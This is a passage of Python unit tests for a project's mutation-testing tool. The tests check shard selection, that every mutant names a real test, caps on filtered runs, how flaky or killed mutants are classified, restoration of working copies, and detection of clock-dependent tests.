        code, lines, _ = self.check({"fails": (0, 1, FAILS_A_TEST), "passes": (0, 0, "OK\n")},
                                    ["fails", "passes"], stale)
        self.assertEqual(lines, ["killed    fails", "SURVIVED  passes", "STALE     gone (the code it mutates has changed)",
                                 "1 of 3 mutants killed"])
        self.assertEqual(code, 1)

    def test_a_run_that_raises_is_an_error_and_the_rest_still_report(self):
        code, lines, _ = self.check({"before": (0, 1, FAILS_A_TEST), "raises": (0, 1, OSError("disk full")),
                                     "after": (0.2, 1, FAILS_A_TEST)}, ["before", "raises", "after"])
        self.assertEqual(lines, ["killed    before", "ERROR     raises (the run failed with OSError: disk full%s)" % AGAIN,
                                 "killed    after", "2 of 3 mutants killed"])
        self.assertEqual(code, 1)

    def test_every_mutant_is_in_exactly_one_shard(self):
        # CI runs the mutants in shards, one job each. A mutant in no shard is a rule nobody checks; one in two is run
        # twice. Each is told apart by its name, so no name is used twice.
        names = [mutant[0] for mutant in mutants.MUTANTS]
        self.assertEqual(len(names), len(set(names)))
        for count in range(1, 13):
            placed = [mutant[0] for index in range(count) for mutant in mutants.shard(mutants.MUTANTS, index, count)]
            self.assertEqual(sorted(placed), sorted(names), count)

    def test_a_shard_is_read_from_the_matrix_or_the_run_stops(self):
        every = len(mutants.MUTANTS)
        self.assertEqual(mutants.selected({}), (mutants.MUTANTS, "", None))
        chosen, where, at_once = mutants.selected({"MUTANTS_SHARD": "2", "MUTANTS_SHARDS": "6"})
        self.assertEqual((chosen, where, at_once), (mutants.shard(mutants.MUTANTS, 2, 6), ", in shard 2 of 6 counted "
                                                                                          "from 0", None))
        for shard, count, said in (("1", None, "set both"), (None, "6", "set both"), ("", "6", "set both"),
                                   ("one", "6", "set both"), ("-1", "6", "set both"), ("1.0", "6", "set both"),
                                   ("6", "6", "below the count"), ("0", "0", "below the count"),
                                   (str(every), str(every + 1), "holds no mutant")):
            given = {k: v for k, v in (("MUTANTS_SHARD", shard), ("MUTANTS_SHARDS", count)) if v is not None}
            with self.assertRaises(ValueError, msg=given) as raised:
                mutants.selected(given)
            self.assertIn(said, str(raised.exception), given)
        # From the front door, a shard it cannot read stops the run before any test runs.
        env = dict(os.environ, MUTANTS_SHARD="0", MUTANTS_SHARDS="0")
        done = subprocess.run([sys.executable, "-m", "tools.mutants"], cwd=str(ROOT), env=env, capture_output=True,
                              text=True, timeout=60)
        self.assertEqual((done.returncode, done.stdout.strip()), (1, "MUTANTS_SHARD is 0 and MUTANTS_SHARDS is 0; the "
                                                                     "shard is counted from 0, below the count"))

    def test_every_mutant_names_a_test_that_exists(self):
        # Issue 217: a mutant that names no test ran the whole suite, which was most of a CI leg's time, and a name
        # that does not exist made its mutant an ERROR. Every mutant names the tests that kill it, and each exists.
        self.assertEqual(mutants.unnamed(mutants.MUTANTS), [])
        good = ("tests.test_tools.Mutants.test_every_mutant_names_a_test_that_exists", "tests.test_tools.Mutants",
                "tests.test_tools")
        self.assertEqual(mutants.unnamed([("ok", "k.py", "rule\n", "x\n", good)]), [])
        for bad, why in (("tests.test_tools.NeedsPassed", "does not exist"), ("tests.test_tools.Mutants.test_gone",
                         "does not exist"), ("tests.test_nowhere", "whose module does not exist"),
                         ("tests.test_simulator.Roll", "not a TestCase"), ("tests.test_tools.Mutants.check",
                         "not a test method"), ("tools.mutants", "not a test module"),
                         ("tests.support", "not a test module"), ("unittest.TestCase", "not a test module"),
                         ("tests.test_tools.unittest.TestCase", "not a TestCase"), ("tests.test_tools.suite_of",
                         "not a method of a TestCase"), ("", "not a test module"), (".tests.test_tools",
                         "not a test module"), ("tests..test_tools", "not a test module"),
                         # A module below a package under tests/ is a test module by its own name, as modules() lists it.
                         ("tests.deep.test_nested", "whose module does not exist"), ("tests.deep.nested",
                         "whose module does not exist"), ("tests.support.x", "not a test module")):
            said = mutants.unnamed([("m", "k.py", "rule\n", "x\n", (bad,))])
            self.assertEqual(len(said), 1, bad)
            self.assertIn(why, said[0], bad)
        self.assertEqual(mutants.unnamed([("m", "k.py", "rule\n", "x\n")]), ["'m' names no test; name the tests that "
                                                                            "kill it"])
        self.assertEqual(mutants.unnamed([("m", "k.py", "rule\n", "x\n", ())])[0][:19], "'m' names no test; ")
        # The front door refuses such a list before any test runs.
        with self.assertRaises(ValueError) as raised:
            mutants.selected({}, mutants=[("m", "k.py", "rule\n", "x\n")])
        self.assertIn("1 mutant(s) name no test", str(raised.exception))

    def test_slow_modules_run_last(self):
        # Issue 217: the fallback after the tests a mutant names ran the modules alphabetically, so a mutant in tools/
        # ran test_hooks and test_simulator before test_tools killed it. The slow modules, SLOW's and test_hooks, run
        # last; every module still runs, read from the directory, so a new one is never left out.
        passes, fails = "    def test_a(self):\n        pass\n", "    def test_a(self):\n        self.fail()\n"
        module = "import unittest\n\n\nclass T(unittest.TestCase):\n"
        where = suite_of(passes, {"tests/test_hooks.py": module + fails, "tests/test_simulator.py": module + passes,
                                  "tests/test_new.py": module + passes, "tests/test_aardvark.py": module + passes,
                                  "tests/deep/__init__.py": "", "tests/deep/test_nested.py": module + passes,
                                  "tests/testplain.py": module + passes, "tests/support.py": module + fails})
        self.assertEqual(mutants.modules(where), ["tests.deep.test_nested", "tests.test_aardvark", "tests.test_new",
                                                  "tests.test_x", "tests.testplain", "tests.test_hooks",
                                                  "tests.test_simulator"])
        status, output = mutants.suite(where)
        self.assertEqual((status, output.count("FAIL: test_a (tests.test_hooks.T")), (1, 1), output)
        self.assertIn("Ran 6 tests", output, "every quick module, a nested one too, ran before the slow one that failed")
        where = suite_of(passes, {"tests/test_new.py": module + fails})
        self.assertEqual(mutants.verdict(*mutants.suite(where))[0], "killed", "a module not named anywhere is run")

    def test_a_filtered_run_is_capped(self):
        # Issue 217: `python3 -m tools.mutants PATH...` is the one local run allowed: the mutants whose target is one
        # of the paths, at most FILTER_MOST of them, FILTER_WORKERS at a time, never a shard. With no path, as before.
        few = [("m%d" % n, "kernel/gate.py" if n % 2 else "kernel/brakes.py", "rule\n", "x\n",
                ("tests.test_tools.Mutants",)) for n in range(50)]
        chosen, where, at_once = mutants.selected({}, ["kernel/gate.py"], few)
        self.assertEqual((len(chosen), where, at_once), (25, ", of kernel/gate.py", mutants.FILTER_WORKERS))
        self.assertEqual(mutants.FILTER_WORKERS, 2)
        self.assertEqual(mutants.selected({}, ["./kernel/gate.py"], few)[0], chosen, "a path is read however spelt")
        self.assertEqual(mutants.selected({}, ["kernel//gate.py"], few)[0], chosen)
        dotted = [("d", ".github/workflows/verify.yml", "a\n", "b\n", ("tests.test_tools.Mutants",))]
        self.assertEqual(mutants.selected({}, [".github/workflows/verify.yml"], dotted)[0], dotted, "a dot is kept")
        with self.assertRaises(ValueError):
            mutants.selected({}, ["../kernel/gate.py"], few)
        self.assertEqual(mutants.selected({}, [], few), (few, "", None), "with no path, every mutant, as before")
        for environ, paths, said in (({}, ["kernel/gate.py", "kernel/brakes.py"], "a filtered run breaks at most 40"),
                                     ({}, ["kernel/nowhere.py"], "no mutant targets kernel/nowhere.py"),
                                     ({}, ["kernel/gate.py", "kernel/nowhere.py"], "no mutant targets kernel/nowhere.py"),
                                     ({"MUTANTS_SHARD": "0", "MUTANTS_SHARDS": "2"}, ["kernel/gate.py"], "do not mix"),
                                     ({"MUTANTS_SHARD": "0"}, ["kernel/gate.py"], "do not mix"),
                                     ({"MUTANTS_SHARDS": "2"}, ["kernel/gate.py"], "do not mix")):
            with self.assertRaises(ValueError, msg=paths) as raised:
                mutants.selected(environ, paths, few)
            self.assertIn(said, str(raised.exception), paths)
        self.assertEqual(mutants.FILTER_MOST, 40)
        # From the front door, too many mutants stop the run before any test runs; a shard CI set is not this run's.
        env = {name: value for name, value in os.environ.items() if not name.startswith("MUTANTS_")}
        done = subprocess.run([sys.executable, "-m", "tools.mutants", "kernel/derive.py"], cwd=str(ROOT), env=env,
                              capture_output=True, text=True, timeout=120)
        self.assertEqual(done.returncode, 1, done.stdout[-300:])
        self.assertIn("a filtered run breaks at most 40", done.stdout)

    def test_tests_that_fail_unbroken_stop_the_check_before_any_mutant(self):
        calls = []
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("fails"), tree({"k.py": "rule\n"}), told({"rule": (0, 1, FAILS_A_TEST)}, calls))
        self.assertEqual((code, calls), (1, ["rule", "done rule"]))
        self.assertIn("the tests fail before anything is broken", said.getvalue())

    def test_a_failure_the_mutant_causes_kills_it(self):
        code, lines, calls = self.check({"breaks": (0, 1, FAILS_A_TEST)}, ["breaks"])
        self.assertEqual((code, lines), (0, ["killed    breaks", "1 of 1 mutants killed"]))
        self.assertEqual(calls[2:], ["breaks", "done breaks", "breaks alone", "done breaks alone", "rule alone",
                                     "done rule alone"], "it failed again alone on the mutant, and passed alone unbroken")
        # From the front door: a test that reads the rule fails on its mutant whole and alone, and passes without it.
        root = suite_of("    def test_x(self):\n        self.assertEqual(open('k.py').read(), 'rule\\n')\n",
                        {"k.py": "rule\n"})
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("breaks"), root, mutants.suite, 1)
        self.assertEqual((code, said.getvalue().splitlines()), (0, ["killed    breaks", "1 of 1 mutants killed"]))

    def test_a_mutant_whose_only_failure_is_unrelated_survives(self):
        # A test failed under load on the mutant, and passes when run again: the suite runs once more, and passes.
        code, lines, calls = self.check({"unrelated": [(0, 1, FAILS_A_TEST), PASSES], "unrelated alone": PASSES},
                                        ["unrelated"])
        self.assertEqual((code, lines), (1, ["SURVIVED  unrelated", "0 of 1 mutants killed"]))
        self.assertEqual([c for c in calls if not c.startswith("done ")],
                         ["rule", "unrelated", "unrelated alone", "rule alone", "unrelated"])
        # From the front door: a test that fails on its second run, the first on the mutant, and on no other.
        root = suite_of("    def test_x(self):\n        with open(os.environ['COUNTED'], 'a+') as runs:\n"
                        "            runs.write('.')\n            runs.seek(0)\n"
                        "            self.assertNotEqual(runs.read(), '..')\n", {"k.py": "rule\n"})
        counted = pathlib.Path(tempfile.mkdtemp(dir=SCRATCH.name)) / "counted"
        with mock.patch.dict(os.environ, {"COUNTED": str(counted)}), \
                contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("unrelated"), root, mutants.suite, 1)
        self.assertEqual((code, said.getvalue().splitlines()), (1, ["SURVIVED  unrelated", "0 of 1 mutants killed"]))
        self.assertEqual(counted.read_text(), "." * 5, "unbroken, whole, alone, alone unbroken, whole again")

    def test_a_test_that_fails_on_the_unbroken_code_too_kills_nothing(self):
        code, lines, _ = self.check({"x": (0, 1, FAILS_A_TEST), "rule alone": (0, 1, FAILS_A_TEST)}, ["x"])
        self.assertEqual((code, lines), (1, ["FLAKY     x (tests.test_x.T.test_x failed on the unbroken code too%s)" % MEND,
                                             "0 of 1 mutants killed"]))

    def test_a_test_that_fails_only_in_a_copy_kills_nothing(self):
        # The checkout has a .git, and a copy has none: the test fails on every mutant and passes where the tests were
        # first run, so only the unbroken code in the same copy shows it is not the mutant's.
        root = suite_of("    def test_x(self):\n        self.assertTrue(os.path.exists('.git'))\n",
                        {"k.py": "rule\n", ".git/HEAD": "ref: refs/heads/main\n"})
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("anything"), root, mutants.suite, 1)
        self.assertEqual((code, said.getvalue().splitlines()),
                         (1, ["FLAKY     anything (tests.test_x.T.test_x failed on the unbroken code too%s)" % MEND,
                              "0 of 1 mutants killed"]))

    def test_a_mutant_leaves_no_trace_in_the_copy_the_next_one_is_lent(self):
        # However its runs end, a crash or a hang among them, a mutant's file is put back byte for byte, and the next
        # mutant is lent the same copy: one is made for each worker, not one for each mutant.
        root = tree({"k.py": "rule\n"})
        seen = []

        def run(work, first=(), only=None):
            said = (work / "k.py").read_bytes()
            seen.append((work, said))
            if said == b"crashes\n":
                raise OSError("the runner died")
            if said == b"hangs\n":
                return None, ""
            return (0, "OK\n") if said == b"rule\n" else (1, FAILS_A_TEST)
        with contextlib.redirect_stdout(io.StringIO()) as said:
            code = mutants.main(mutate("crashes", "hangs", "breaks", "breaks too"), root, run, 1)
        self.assertEqual((code, said.getvalue().splitlines()), (1, [
            "ERROR     crashes (the run failed with OSError: the runner died%s)" % AGAIN,
            "ERROR     hangs (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN),
            "killed    breaks", "killed    breaks too", "2 of 4 mutants killed"]))
        self.assertEqual(len({work for work, _ in seen} - {root}), 1, "one copy, lent to each mutant in turn")
        self.assertEqual([text for work, text in seen if work != root],
                         [b"crashes\n", b"hangs\n", b"breaks\n", b"breaks\n", b"rule\n", b"breaks too\n", b"breaks too\n",
                          b"rule\n"], "each mutant found the file as the tree has it, and its unbroken side too")
        # A copy left changed is an ERROR for the mutant it is lent to, and is never lent again.
        trees = mutants.Trees(root, tempfile.mkdtemp(dir=SCRATCH.name))
        with trees.lent() as left:
            (left / "k.py").write_text("rule\nleft\n")
        outcome, why = mutants.guarded(mutate("next")[0], root, run, trees)
        self.assertEqual(outcome, "ERROR")
        self.assertIn("k.py in this copy is not the tree's", why)
        self.assertEqual(mutants.guarded(mutate("next")[0], root, run, trees), ("killed", ""))
        self.assertNotEqual(seen[-1][0], left, "a fresh copy was made in its place")
        # A copy whose target cannot be read is an ERROR for the mutant it is lent to, and is never lent again.
        with trees.lent() as missing:
            (missing / "k.py").unlink()
        outcome, why = mutants.guarded(mutate("next")[0], root, run, trees)
        self.assertEqual(outcome, "ERROR")
        self.assertIn("k.py could not be read in this copy", why)
        self.assertEqual(mutants.guarded(mutate("next")[0], root, run, trees), ("killed", ""))
        self.assertNotEqual(seen[-1][0], missing, "a fresh copy was made in its place")
        self.assertEqual(min(os.cpu_count() or 1, mutants.WORKERS), min(os.cpu_count() or 1, 4))

    def test_a_failure_that_is_not_the_mutants_twice_is_flaky_and_fails_the_check(self):
        code, lines, calls = self.check({"x": (0, 1, FAILS_A_TEST), "x alone": PASSES, "y": (0, 1, FAILS_A_TEST)},
                                        ["x", "y"])
        self.assertEqual(lines, ["FLAKY     x (tests.test_x.T.test_x passed when run again on the mutant%s)" % MEND,
                                 "killed    y", "1 of 2 mutants killed"])
        self.assertEqual((code, calls.count("x"), calls.count("x alone")), (1, 2, 2), "the suite ran twice on it")
        # A run alone that hangs or crashes is an ERROR, as any other run is: never killed, and never FLAKY.
        code, lines, calls = self.check({"x": (0, 1, FAILS_A_TEST), "x alone": (0, None, "")}, ["x"])
        self.assertEqual(lines[0], "ERROR     x (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN))
        self.assertNotIn("rule alone", calls, "the unbroken run was skipped when the mutant run errored")
        code, lines, _ = self.check({"x": (0, 1, FAILS_A_TEST), "rule alone": (0, None, "")}, ["x"])
        self.assertEqual(lines[0], "ERROR     x (the run took longer than %d s%s)" % (mutants.TIMEOUT, AGAIN))

    def test_the_failing_test_is_read_from_the_line_each_python_prints(self):
        lines = {
            "FAIL: test_x (tests.m.T)": "tests.m.T.test_x",                     # 3.9 and 3.10
            "FAIL: test_x (tests.m.T.test_x)": "tests.m.T.test_x",              # 3.11 and later
            "ERROR: test_x (tests.m.T)": "tests.m.T.test_x",
            "FAIL: test_x (tests.m.T) [one] (i=1)": "tests.m.T.test_x",         # a subtest
            "FAIL: test_x (tests.m.T.test_x) (i=1)": "tests.m.T.test_x",
            "ERROR: setUpClass (tests.m.T)": "tests.m.T",                       # the class
            "FAIL: test_x (tests.m.T)\nFAIL: test_x (tests.m.T.test_x)": "tests.m.T.test_x",
            "FAIL: test_x (tests.m.T)\nFAIL: test_y (tests.m.T)": None,          # two tests: which is unknown
            "FAILED (failures=1)": None,
            "FAIL: test x (tests.m.T)": None,
        }
        for said, test in lines.items():
            output = "F\n" + "".join("%s\n%s\n%s\nAssertionError\n" % ("=" * 70, line, "-" * 70)
                                     for line in said.splitlines())
            self.assertEqual(mutants.failed_test(output), test, said)
        # A line of that form in a test's own message is not unittest's.
        output = "F\n%s\nFAIL: test_x (tests.m.T)\n%s\nAssertionError: FAIL: test_y (tests.m.T)\nFAIL: test_y (tests.m.T)\n"
        self.assertEqual(mutants.failed_test(output % ("=" * 70, "-" * 70)), "tests.m.T.test_x")
        # The line this Python prints.
        status, output = mutants.suite(suite_of("    def test_x(self):\n        self.fail()\n"))
        self.assertEqual(mutants.failed_test(output), "tests.test_x.T.test_x")
        # A failure whose test cannot be read is an ERROR, and kills nothing.
        code, lines, _ = self.check({"x": (0, 1, "F\nFAILED (failures=1)\n")}, ["x"])
        self.assertEqual(lines[0], "ERROR     x (the one test that failed cannot be read from the output%s)" % AGAIN)

    def test_every_test_timed_by_the_wall_clock_is_marked_and_skipped_when_mutating(self):
        # A test that reads the clock, or sleeps, can fail under load for its own reasons, and must not kill a mutant.
        clock = {"monotonic", "monotonic_ns", "perf_counter", "perf_counter_ns", "time", "time_ns", "sleep"}
        marked, reads = set(), set()
        for path in sorted((ROOT / "tests").glob("test_*.py")):
            module = ast.parse(path.read_text())
            # time under any name it is imported as, and any of its clocks imported on their own
            modules = {a.asname or a.name for n in ast.walk(module) if isinstance(n, ast.Import) for a in n.names
                       if a.name == "time"}
            bare = {name for n in ast.walk(module) if isinstance(n, ast.ImportFrom) and n.module == "time"
                    for a in n.names for name in (clock if a.name == "*" else [a.asname or a.name] if a.name in clock else [])}
            for owner in [n for n in ast.walk(module) if isinstance(n, ast.ClassDef)]:
                for node in owner.body:
                    if not isinstance(node, ast.FunctionDef) or not node.name.startswith("test_"):
                        continue
                    where = (path.name, owner.name, node.name)
                    if any("wall_clock" in ast.dump(d) for d in node.decorator_list):
                        marked.add(where)
                    if any((isinstance(n, ast.Attribute) and isinstance(n.value, ast.Name) and n.value.id in modules
                            and n.attr in clock) or (isinstance(n, ast.Name) and n.id in bare) for n in ast.walk(node)):
                        reads.add(where)
        # The order of the runs is told by a stand-in that sleeps: that test reads no clock of its own.
        timed = reads | {("test_tools.py", "Mutants", "test_mutants_are_reported_in_their_order_however_their_runs_finish")}
        self.assertEqual(marked, timed, "mark @wall_clock, from tests/support.py, the tests timed by it and no other")
        self.assertIn(("test_hooks.py", "ProtectedPaths", "test_a_wildcard_that_would_backtrack_is_read_within_the_budget"),
                      marked)

        def test_x():
            pass
        with mock.patch.dict(os.environ, {"MUTATING": "1"}):
            self.assertTrue(getattr(support.wall_clock(test_x), "__unittest_skip__", False))
        with mock.patch.dict(os.environ, {"MUTATING": ""}):
            self.assertIs(support.wall_clock(test_x), test_x, "in make verify it runs as it is")
